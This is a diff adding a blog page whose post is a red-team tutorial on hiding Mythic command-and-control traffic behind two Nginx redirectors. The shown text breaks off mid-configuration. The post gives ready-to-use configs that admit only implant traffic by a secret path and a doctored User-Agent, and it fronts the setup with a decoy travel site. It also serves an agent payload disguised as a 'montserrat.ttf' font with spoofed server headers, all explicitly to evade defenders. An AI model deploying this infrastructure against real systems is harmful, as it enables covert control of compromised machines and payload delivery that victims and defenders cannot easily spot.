@@ -1,0 +1,947 @@
+<!DOCTYPE html>
+<html lang="en"
+  x-data
+  :class="$store.darkMode.class()"
+  :data-theme="$store.darkMode.theme()">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Frontend Lies Backend Spies - C2 Redirector | Bruno Blog</title>
+
+    
+  
+    <link href="/favicon.ico" rel="icon" type="image/x-icon" />
+  
+
+
+<link rel="canonical" href="http://localhost:1313/posts/2025-08-05-frontend-lies-backend-spies/" />
+
+
+
+<meta name="author" content="" />
+<meta name="description" content="Introduction In this post, we’ll walk through a possible architecture for setting up a C2 redirector using Nginx to front and forward traffic to a Mythic C2 server. The goal is to create a stealthy, realistic-looking infrastructure that blends in with normal web traffic — making it harder for defenders to detect or block command-and-control activity. We’ll cover the use of decoy subdomains, SSL certificates, traffic redirection, and how to configure everything to work seamlessly together.
+" />
+
+
+<meta name="keywords" content="Red Teaming">
+
+
+
+<meta name="generator" content="Hugo 0.147.0">
+
+
+<meta property="og:url" content="http://localhost:1313/posts/2025-08-05-frontend-lies-backend-spies/">
+  <meta property="og:site_name" content="Bruno Blog">
+  <meta property="og:title" content="Frontend Lies Backend Spies - C2 Redirector">
+  <meta property="og:description" content="Introduction In this post, we’ll walk through a possible architecture for setting up a C2 redirector using Nginx to front and forward traffic to a Mythic C2 server. The goal is to create a stealthy, realistic-looking infrastructure that blends in with normal web traffic — making it harder for defenders to detect or block command-and-control activity. We’ll cover the use of decoy subdomains, SSL certificates, traffic redirection, and how to configure everything to work seamlessly together.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-08-05T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-08-05T00:00:00+00:00">
+    <meta property="article:tag" content="Red Teaming">
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Frontend Lies Backend Spies - C2 Redirector">
+  <meta name="twitter:description" content="Introduction In this post, we’ll walk through a possible architecture for setting up a C2 redirector using Nginx to front and forward traffic to a Mythic C2 server. The goal is to create a stealthy, realistic-looking infrastructure that blends in with normal web traffic — making it harder for defenders to detect or block command-and-control activity. We’ll cover the use of decoy subdomains, SSL certificates, traffic redirection, and how to configure everything to work seamlessly together.">
+
+
+
+
+<link rel="stylesheet" href="/css/output.css" />
+
+
+
+
+    
+
+
+<style>
+  pre {
+    padding: 1em;
+    overflow: auto;
+  }
+</style>
+
+
+
+
+
+
+
+
+
+    
+
+    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3/dist/cdn.min.js" integrity="sha256-4EHxtjnR5rL8JzbY12OKQJr81ESm7JBEb49ORPo29AY=" crossorigin="anonymous"></script>
+  </head>
+
+  <body x-data="{
+    flip: false,
+  }">
+    
+    <div id="dream-global-bg"></div>
+
+    
+<nav x-data="{ isSticky: false }"
+  x-init="window.addEventListener('scroll', () => { isSticky = window.scrollY > 30 })"
+  class="sticky top-0 z-30 mt-4 lg:mt-8 py-4"
+  :class="{ 'bg-base-100 shadow-lg dark:border-b dark:border-base-content/30': isSticky }">
+
+  
+  <div class="container flex justify-between max-w-[65ch] mx-auto px-4 md:px-0">
+  
+    <section class="flex items-center gap-4">
+      <div class="avatar cursor-pointer hover:avatar-online" @click="flip = !flip" title="Flip it!">
+        <div class="h-10 rounded-full">
+          <img src="/favicon.ico" alt="Bruno Blog" />
+        </div>
+      </div>
+
+      
+      <div>
+        
+        <a href="http://localhost:1313/" class="text-lg font-semibold cursor-pointer">
+          Bruno Blog
+        </a>
+        
+        
+      </div>
+      
+    </section>
+
+    
+    
+
+    <div class="dropdown dropdown-end sm:hidden">
+      <div tabindex="0" role="button" class="btn btn-ghost btn-square" aria-label="Select an option">
+        <ion-icon name="menu" class="text-2xl"></ion-icon>
+      </div>
+      <ul tabindex="0" class="dropdown-content menu w-36 bg-base-100 rounded-box z-1 shadow-md">
+        
+
+
+
+
+
+
+
+<li>
+  <div role="link" tabindex="0" class="inline-flex items-center p-2 cursor-pointer" @click="flip = !flip" title="About">
+    <ion-icon name="information-circle"></ion-icon>About</div>
+</li>
+
+
+
+
+
+
+
+<li>
+  <a class="group inline-flex items-center p-2 cursor-pointer" href="/search" title="Search">
+    <ion-icon name="search"></ion-icon>
+    Search
+  </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+<li>
+  <a class="inline-flex items-center p-2 cursor-pointer" href="/posts" title="Archives">
+    <ion-icon name="archive"></ion-icon>
+    Archives
+  </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+<li>
+  <a class="inline-flex items-center p-2 cursor-pointer" href="/tags" title="All Tags">
+    <ion-icon name="pricetags"></ion-icon>
+    All Tags
+  </a>
+</li>
+
+
+
+
+
+
+      </ul>
+    </div>
+    <section class="hidden sm:flex sm:items-center sm:gap-2 md:gap-4">
+      
+
+      
+      
+
+
+
+
+<div role="link" tabindex="0" class="text-sm font-semibold cursor-pointer hover:underline" @click="flip = !flip" title="About">About</div>
+
+
+
+
+
+      
+      
+<a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary" href="/search" title="Search">
+  <ion-icon class="group-hover:text-primary-content" name="search"></ion-icon>
+</a>
+
+
+      
+      
+
+
+
+
+
+      
+      
+<a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary" href="/posts" title="Archives">
+  <ion-icon class="group-hover:text-primary-content" name="archive"></ion-icon>
+</a>
+
+
+      
+      
+
+
+
+
+
+      
+      
+<a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary" href="/tags" title="All Tags">
+  <ion-icon class="group-hover:text-primary-content" name="pricetags"></ion-icon>
+</a>
+
+
+      
+
+      
+
+      
+    </section>
+  </div>
+</nav>
+
+
+    <div class="flip-container" :class="{ 'flip-it': flip }">
+      <div class="flipper">
+        <div class="front">
+          <div class="container">
+            
+<div class="lg:grid lg:grid-cols-4 gap-4 mt-4 px-4">
+  <div class="hidden lg:block">
+    
+  </div>
+
+  <div class="lg:col-span-2">
+    <article class="mx-auto prose prose-quoteless dark:prose-invert" id="dream-single-post-main" itemscope itemtype="http://schema.org/Article">
+      
+  <meta itemprop="name" content="Frontend Lies Backend Spies - C2 Redirector">
+  <meta itemprop="description" content="Introduction In this post, we’ll walk through a possible architecture for setting up a C2 redirector using Nginx to front and forward traffic to a Mythic C2 server. The goal is to create a stealthy, realistic-looking infrastructure that blends in with normal web traffic — making it harder for defenders to detect or block command-and-control activity. We’ll cover the use of decoy subdomains, SSL certificates, traffic redirection, and how to configure everything to work seamlessly together.">
+  <meta itemprop="datePublished" content="2025-08-05T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-08-05T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1741">
+  <meta itemprop="keywords" content="Red Teaming">
+
+      <header>
+        <h1 itemprop="headline">Frontend Lies Backend Spies - C2 Redirector</h1>
+        <p class="text-sm">
+          
+            Tuesday, Aug 5, 2025
+          
+
+          | <span>9 minute read</span>
+
+          
+          | <span>Updated at
+            
+              Tuesday, Aug 5, 2025
+            </span>
+          
+        </p>
+
+        
+        <div class="flex justify-between">
+          
+
+          <div class="flex items-center gap-2">
+  
+  
+
+  
+  
+  
+  
+  
+    <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary"
+      href="https://x.com/intent/post?text=Frontend%20Lies%20Backend%20Spies%20-%20C2%20Redirector&amp;url=http://localhost:1313/posts/2025-08-05-frontend-lies-backend-spies/" target="_blank" rel="noopener noreferrer"
+      title="Share on X">
+      <ion-icon class="group-hover:text-primary-content" name="logo-x"></ion-icon>
+    </a>
+  
+    <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary"
+      href="https://facebook.com/sharer/sharer.php?u=http://localhost:1313/posts/2025-08-05-frontend-lies-backend-spies/" target="_blank" rel="noopener noreferrer"
+      title="Share on Facebook">
+      <ion-icon class="group-hover:text-primary-content" name="logo-facebook"></ion-icon>
+    </a>
+  
+    <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary"
+      href="https://wa.me/?text=Frontend%20Lies%20Backend%20Spies%20-%20C2%20Redirector%20http://localhost:1313/posts/2025-08-05-frontend-lies-backend-spies/" target="_blank" rel="noopener noreferrer"
+      title="Share on WhatsApp">
+      <ion-icon class="group-hover:text-primary-content" name="logo-whatsapp"></ion-icon>
+    </a>
+  
+
+  
+  
+</div>
+
+        </div>
+      </header>
+
+      <section id="dream-single-post-content" itemprop="articleBody">
+        
+
+        <h2 id="introduction">Introduction</h2>
+<p>In this post, we’ll walk through a possible architecture for setting up a C2 redirector using Nginx to front and forward traffic to a Mythic C2 server. The goal is to create a stealthy, realistic-looking infrastructure that blends in with normal web traffic — making it harder for defenders to detect or block command-and-control activity. We’ll cover the use of decoy subdomains, SSL certificates, traffic redirection, and how to configure everything to work seamlessly together.</p>
+
+
+
+  <blockquote class="dream-alert note">
+    <p class="heading">
+      <ion-icon name="information-circle-outline"></ion-icon>Note</p>
+    <p>This post will not cover EDR evasion techniques, as the focus here is solely on building the infrastructure. Evasion strategies will be explored in future posts.</p>
+  </blockquote>
+
+<h2 id="architecture">Architecture</h2>
+<figure class="post-image"><img src="/c2redirector/normaluser.png">
+</figure>
+
+<figure class="post-image"><img src="/c2redirector/infecteduser.png">
+</figure>
+
+<p>The flow is quite straightforward. An infected user with the Mythic agent on their machine sends a request to Server 1 using a specific path and a particular User-Agent. Server 1 receives the request, and Nginx checks that it is coming from the Mythic agent, so it redirects the request to Server 2. Server 2 then receives the request, Nginx verifies it again as coming from the Mythic agent, and redirects it to the HTTP profile that is in listening mode inside the Mythic Docker container.</p>
+<ul>
+<li>
+<p>The specific path is crucial for identifying the real traffic used by the Mythic agent.</p>
+</li>
+<li>
+<p>The User-Agent is also important because it allows us to ignore any traffic that does not have the specific User-Agent.</p>
+</li>
+</ul>
+<p>In this post, I will use a random path just for demonstration purposes, however the idea for the future is to use a more realistic path like <code>https://api.website.com/update</code> and to use a User-Agent that exists but with slight modifications.</p>
+<p>For example, a manipulated User-Agent that goes unnoticed could be something like <code>Mozilla/5.0 (Linux; Androidd 10; K) ApplleWeebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36</code> where <code>Androidd</code> replaces <code>Android</code>, <code>ApplleWeebKit</code> replaces <code>AppleWeebKit</code>, and <code>Safari/5371.361</code> replaces <code>Safari/537.36</code>.</p>
+<h2 id="meet-mythic">Meet Mythic</h2>
+<p><a href="https://github.com/its-a-feature/Mythic" target="_blank">Mythic C2</a>
+ is an open-source, highly customizable command-and-control framework designed for red teams and security researchers. It provides a user-friendly web interface to manage implants, execute commands, and monitor operations in real-time. Mythic supports multiple payload types and allows easy integration with various tools, making it a powerful platform for simulating advanced adversary behavior and testing defensive measures.</p>
+<p>To install Mythic, we follow these steps:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/its-a-feature/Mythic.git
+</span></span><span style="display:flex;"><span>cd Mythic/
+</span></span><span style="display:flex;"><span>sudo ./install_docker_ubuntu.sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># After reboot, ensure Docker is running and Mythic containers are built</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># If starting fresh after reboot, navigate back to Mythic directory</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># cd Mythic/</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># sudo ./install_docker_ubuntu.sh # Run again only if Docker services didn&#39;t start correctly</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># You might also need to run `sudo systemctl start docker` if it didn&#39;t start automatically.</span>
+</span></span><span style="display:flex;"><span>sudo apt-get install make
+</span></span><span style="display:flex;"><span>make
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Install Apollo Agent</span>
+</span></span><span style="display:flex;"><span>./mythic-cli install github https://github.com/MythicAgents/apollo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Install HTTP C2 Profile</span>
+</span></span><span style="display:flex;"><span>./mythic-cli install github https://github.com/MythicC2Profiles/http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start mythic</span>
+</span></span><span style="display:flex;"><span>sudo ./mythic-cli start
+</span></span></code></pre></div><p>When Mythic starts, it exposes port <code>7443</code> to the internet, which we don’t want, so we stop the service using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ./mythic-cli stop
+</span></span></code></pre></div><p>Next, we need to change the variable <code>NGINX_BIND_LOCALHOST_ONLY=false</code> to <code>NGINX_BIND_LOCALHOST_ONLY=true</code> in the <code>.env</code> file.</p>
+<p>After that, we start Mythic again.</p>
+<p>To access the Mythic web interface, simply create an SSH tunnel:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh root@server2 -L 7443:127.0.0.1:7443
+</span></span></code></pre></div><p>Then open your local browser at <code>https://127.0.0.1:7443</code>.</p>
+<figure class="post-image"><img src="/c2redirector/mythic.png">
+</figure>
+
+<p>Since we have already installed the HTTP C2 profile, the next step is to edit the configuration to enable SSL support.</p>
+<figure class="post-image"><img src="/c2redirector/mythichttp1.png">
+</figure>
+
+<p>Then change <code>port</code> from <code>80</code> to <code>443</code> and set <code>use_ssl</code> to <code>true</code>.</p>
+<figure class="post-image"><img src="/c2redirector/mythichttp2.png">
+</figure>
+
+<h2 id="building-the-bait">Building the Bait</h2>
+<p>For the decoy website, we’ll be using <a href="https://gohugo.io/" target="_blank">Hugo</a>
+ with a little help from our friend ChatGPT.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt update
+</span></span><span style="display:flex;"><span>sudo apt install hugo
+</span></span><span style="display:flex;"><span>mkdir travel
+</span></span><span style="display:flex;"><span>cd travel
+</span></span><span style="display:flex;"><span>git clone git@github.com:statichunt/iWriter-hugo.git
+</span></span><span style="display:flex;"><span>cd iWriter-hugo/exampleSite/
+</span></span><span style="display:flex;"><span>hugo server --themesDir ../..
+</span></span></code></pre></div><p>First, open the file <code>iWriter-hugo/exampleSite/config/_default/config.toml</code> and update the <code>baseURL</code> setting to <code>/</code>.</p>
+<p>Next, verify the changes by navigating to <code>http://localhost:1313/</code> in your browser.</p>
+<p>When you’re ready to deploy the website, use the build command with the appropriate flags:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hugo --themesDir ../.. --baseURL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://www.website.com/&#34;</span> -d public
+</span></span></code></pre></div><p>Once the site is built, upload the generated public folder to Server 1. You can do this easily using rsync:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rsync -avz public server1:/var/www/travel
+</span></span></code></pre></div><h2 id="crafting-the-redirector">Crafting the Redirector</h2>
+<p>This is where we create the illusion of legitimate web services while secretly forwarding C2 traffic to our Mythic server.</p>
+<p>First, it’s necessary to register a domain that looks legitimate to our target.</p>
+<p>Next, we generate SSL certificates for all our subdomains (on Server 1):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo certbot --nginx -d www.website.com -d api.website.com
+</span></span></code></pre></div><h3 id="nginx-as-a-redirector">Nginx as a Redirector</h3>
+<p>Our Nginx configuration serves three distinct purposes depending on which subdomain is accessed.</p>
+<p>The main decoy site at <code>www.website.com</code> proxies all traffic to our Hugo-built website, ensuring that anyone visiting the main domain sees a legitimate site. This acts as the public-facing facade, providing cover for the real infrastructure.</p>
+<p>Communications with Mythic occur through <code>api.website.com</code>, where the real action happens. All traffic to this subdomain containing our specific path and User-Agent is redirected directly to the Mythic server, allowing our implants to connect seamlessly.</p>
+<p>For payload hosting, the specific path <code>/assets/fonts/montserrat.ttf</code> appears to be a legitimate web font file but is actually serving our shellcode via Mythic’s file hosting service.</p>
+<p>All traffic is automatically redirected to HTTPS, maintaining a legitimate appearance while encrypting all C2 traffic flowing through the infrastructure.</p>
+<h3 id="server-1----the-face">Server 1  - The Face</h3>
+<p>After creating the SSL certificates, it’s time to deploy the decoy website.</p>
+<p>Make sure to copy the <code>travel</code> folder to <code>/var/www</code> before proceeding.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /var/www/travel
+</span></span><span style="display:flex;"><span>hugo
+</span></span><span style="display:flex;"><span>sudo chown -R www-data:www-data /var/www/travel/public
+</span></span><span style="display:flex;"><span>sudo find /var/www/travel/public -type d -exec chmod <span style="color:#ae81ff">755</span> <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span>
+</span></span><span style="display:flex;"><span>sudo find /var/www/travel/public -type f -exec chmod <span style="color:#ae81ff">644</span> <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span>
+</span></span></code></pre></div><p>This will build the website, set the correct ownership, and apply proper permissions to the public folder - making <code>www-data</code> the owner.</p>
+<p>Next, we need to edit the Nginx configuration file responsible for implementing the rules we described above.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@localhost:/etc/nginx/sites-available# cat travel.conf
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Redirect HTTP to HTTPS</span>
+</span></span><span style="display:flex;"><span>server <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    listen 80;
+</span></span><span style="display:flex;"><span>    server_name www.website.com;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">301</span> https://$host$request_uri;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Redirect HTTP to HTTPS</span>
+</span></span><span style="display:flex;"><span>server <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    listen 80;
+</span></span><span style="display:flex;"><span>    server_name api.website.com;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">301</span> https://$host$request_uri;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Hugo website</span>
+</span></span><span style="display:flex;"><span>server <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    listen <span style="color:#ae81ff">443</span> ssl http2;
+</span></span><span style="display:flex;"><span>    server_name www.website.com;
+</span></span><span style="display:flex;"><span>    client_max_body_size 64M;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ssl_certificate /etc/letsencrypt/live/www.website.com/fullchain.pem;
+</span></span><span style="display:flex;"><span>    ssl_certificate_key /etc/letsencrypt/live/www.website.com/privkey.pem;
+</span></span><span style="display:flex;"><span>    include /etc/letsencrypt/options-ssl-nginx.conf;
+</span></span><span style="display:flex;"><span>    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    location / <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        root /var/www/travel/public;
+</span></span><span style="display:flex;"><span>        index index.html;
+</span></span><span style="display:flex;"><span>        try_files $uri $uri/ <span style="color:#f92672">=</span>404;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># api - mythic</span>
+</span></span><span style="display:flex;"><span>map $http_user_agent $is_secret_user_agent <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    default 0;
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Mozilla/5.0 (Linux; Androidd 10; K) ApplleWeebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/5371.361&#34;</span> 1;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>server <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    listen <span style="color:#ae81ff">443</span> ssl http2;
+</span></span><span style="display:flex;"><span>    server_name api.website.com;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ssl_certificate /etc/letsencrypt/live/site.website.com/fullchain.pem;
+</span></span><span style="display:flex;"><span>    ssl_certificate_key /etc/letsencrypt/live/site.website.com/privkey.pem;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    include /etc/letsencrypt/options-ssl-nginx.conf;
+</span></span><span style="display:flex;"><span>    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Forward all trafic from api.website.com to Server 2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># asdasdasdasdasdasdasd1231239asd90asd is a random location</span>
+</span></span><span style="display:flex;"><span>    location ~* ^/asdasdasdasdasdasdasd1231239asd90asd<span style="color:#f92672">(</span>/.*<span style="color:#f92672">)</span>?$ <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>$is_secret_user_agent <span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> 404;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        proxy_pass https://&lt;PUBLIC IP OF SERVER 2&gt;:8443;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        proxy_ssl_verify off;
+</span></span><span style="display:flex;"><span>        proxy_set_header Host $host;
+</span></span><span style="display:flex;"><span>        proxy_set_header X-Real-IP $remote_addr;
+</span></span><span style="display:flex;"><span>        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+</span></span><span style="display:flex;"><span>        proxy_set_header X-Forwarded-Proto $scheme;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    location /assets/fonts/montserrat.ttf <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        proxy_pass https://&lt;PUBLIC IP OF SERVER 2&gt;:8443;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        proxy_hide_header Content-Disposition;
+</span></span><span style="display:flex;"><span>        add_header Content-Type <span style="color:#e6db74">&#34;font/ttf&#34;</span>;
+</span></span><span style="display:flex;"><span>        add_header Content-Disposition <span style="color:#e6db74">&#34;attachment; filename=montserrat.ttf&#34;</span>;
+</span></span><span style="display:flex;"><span>        add_header X-Powered-By <span style="color:#e6db74">&#34;PHP/8.1.9&#34;</span>;
+</span></span><span style="display:flex;"><span>        add_header Server <span style="color:#e6db74">&#34;cloudflare&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        proxy_set_header Host &lt;PUBLIC IP OF SERVER 2&gt;;
+</span></span><span style="display:flex;"><span>        proxy_set_header X-Real-IP $remote_addr;
+</span></span><span style="display:flex;"><span>        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+</span></span><span style="display:flex;"><span>        proxy_set_header X-Forwarded-Proto $scheme;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Test the configuration syntax:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nginx -t
+</span></span></code></pre></div><p>Create a symlink to enable the configuration:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ln -s /etc/nginx/sites-available/travel.conf /etc/nginx/sites-enabled/
+</span></span></code></pre></div><p>Restart the Nginx service:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo systemctl restart nginx
+</span></span></code></pre></div><h3 id="server-2---the-whisperer">Server 2 - The Whisperer</h3>
+<p>Typically, you would use a registered domain to obtain a trusted SSL certificate for Nginx. However, to keep things simple for this setup, we won’t be using a domain right now. Since no domains will be pointing to this server, we’ll create a self-signed SSL certificate to enable HTTPS.</p>
+<p>Run the following commands to generate the self-signed certificate:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo openssl req -x509 -nodes -days <span style="color:#ae81ff">365</span> -newkey rsa:2048 -keyout /etc/ssl/private/nginx-selfsigned.key -out /etc/ssl/certs/nginx-selfsigned.crt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo openssl dhparam -out /etc/ssl/certs/dhparam.pem <span style="color:#ae81ff">2048</span>
+</span></span></code></pre></div><p>Next, we need to edit the Nginx configuration file on Server 2, where Mythic is running locally, to implement the rules we outlined earlier.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@localhost:/etc/nginx/sites-available# cat mythic.conf
+</span></span><span style="display:flex;"><span>server <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    listen <span style="color:#ae81ff">8443</span> ssl; <span style="color:#75715e"># Port that Server 1 forwards to Server 2</span>
+</span></span><span style="display:flex;"><span>    server_name &lt;PUBLIC IP OF SERVER 2&gt;;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># SSL Self Signed</span>
+</span></span><span style="display:flex;"><span>    ssl_certificate /etc/ssl/certs/nginx-selfsigned.crt;
+</span></span><span style="display:flex;"><span>    ssl_certificate_key /etc/ssl/private/nginx-selfsigned.key;
+</span></span><span style="display:flex;"><span>    ssl_dhparam /etc/ssl/certs/dhparam.pem;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Mythic Agent callback with the random path used in Server 1</span>
+</span></span><span style="display:flex;"><span>    location ~ ^/asdasdasdasdasdasdasd1231239asd90asd/?<span style="color:#f92672">(</span>.*<span style="color:#f92672">)</span>$ <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Forwards traffic to http profile that resides in Mythic</span>
+</span></span><span style="display:flex;"><span>        proxy_pass https://127.0.0.1:443$request_uri;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        proxy_ssl_verify off;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        proxy_set_header Host 127.0.0.1;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        proxy_set_header X-Real-IP $remote_addr;
+</span></span><span style="display:flex;"><span>        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+</span></span><span style="display:flex;"><span>        proxy_set_header X-Forwarded-Proto $scheme;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        proxy_redirect / /asdasdasdasdasdasdasd1231239asd90asd/;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Payload host</span>
+</span></span><span style="display:flex;"><span>    location /assets/fonts/montserrat.ttf <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    	<span style="color:#75715e"># Direct download of Apollo Agent available in Mythic Web Interface</span>
+</span></span><span style="display:flex;"><span>        proxy_pass https://127.0.0.1:7443/direct/download/92ca6c6b-f9b2-4ab4-8114-dce0936f3a0c;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        proxy_ssl_verify off;
+</span></span><span style="display:flex;"><span>        proxy_set_header Host 127.0.0.1;
